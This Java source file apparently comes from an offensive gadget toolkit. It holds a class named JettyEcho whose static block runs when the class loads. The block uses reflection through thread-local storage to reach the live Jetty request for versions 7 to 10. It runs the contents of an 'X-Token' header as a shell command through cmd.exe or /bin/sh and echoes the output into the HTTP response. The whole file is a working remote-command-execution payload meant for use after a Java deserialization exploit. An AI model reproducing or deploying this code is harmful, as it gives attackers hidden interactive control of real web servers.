package org.example.gadget;

import java.lang.reflect.Field;

/**
 * @author Whoopsunix
 * <p>
 * TargetObject = {java.lang.Thread}
 * ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
 * ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
 * ---> [13] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
 * ---> value = {org.eclipse.jetty.server.AsyncHttpConnection}
 * ---> _request = {org.eclipse.jetty.server.Request}
 * idea_express: TargetObject.threadLocals.get("table").get("13").get("value")._request
 * <p>
 * Vsersion test
 *  7.x、8.x、9.x、10.x
 */
public class JettyEcho {
    static {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");
            boolean isEcho = false;
            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null || isEcho)
                    continue;
                Object value = getFieldValue(entry, "value");
                // Jetty 7、8
                if (value.getClass().getName().equals("org.eclipse.jetty.server.AsyncHttpConnection")) {
                    Object request = getFieldValue(value, "_request");
                    // writer 为 null 实际还是赋值为 AbstractHttpConnection
//                    Object response = getFieldValue(value, "_response");
                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "X-Token");
                    if (header == null && header.isEmpty()) {
                        continue;
                    }

                    String result = exec(header);

                    Object printWriter;
                    try {
                        printWriter = value.getClass().getDeclaredMethod("getPrintWriter", String.class).invoke(value, "utf-8");
                    } catch (NoSuchMethodException e) {
                        printWriter = value.getClass().getSuperclass().getDeclaredMethod("getPrintWriter", String.class).invoke(value, "utf-8");
                    }

                    try {
                        printWriter.getClass().getDeclaredMethod("println", String.class).invoke(printWriter, result);
                    } catch (NoSuchMethodException e) {
                        printWriter.getClass().getSuperclass().getDeclaredMethod("println", String.class).invoke(printWriter, result);
                    }

                    isEcho = true;
                } else if (value.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                    // Jetty 9、10
                    // org.eclipse.jetty.server.HttpConnection$HttpChannelOverHttp 类似 省去几个步骤
                    Object channel = getFieldValue(value, "_channel");
                    Object request = getFieldValue(channel, "_request");
                    Object response = getFieldValue(channel, "_response");
                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "X-Token");
                    String result = exec(header);

                    Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);
                    try{
                        writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
                    } catch (NoSuchMethodException e){
                        writer.getClass().getSuperclass().getDeclaredMethod("println", String.class).invoke(writer, result);
                    }

                    isEcho = true;
                } else if (value.getClass().getName().contains("org.eclipse.jetty.server.nio.SelectChannelConnector")) {
                    // Jetty 7 低版本
                    Object request = getFieldValue(value, "_request");
                    Object response = getFieldValue(value, "_response");
                    String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, "X-Token");
                    String result = exec(header);

                    Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);
                    try{
                        writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
                    } catch (NoSuchMethodException e){
                        writer.getClass().getSuperclass().getDeclaredMethod("println", String.class).invoke(writer, result);
                    }

                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static String exec(String str) {
        String result = "";
        try {
            String[] cmd = null;
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        } catch (Exception e) {

        }
        return result;
    }

}
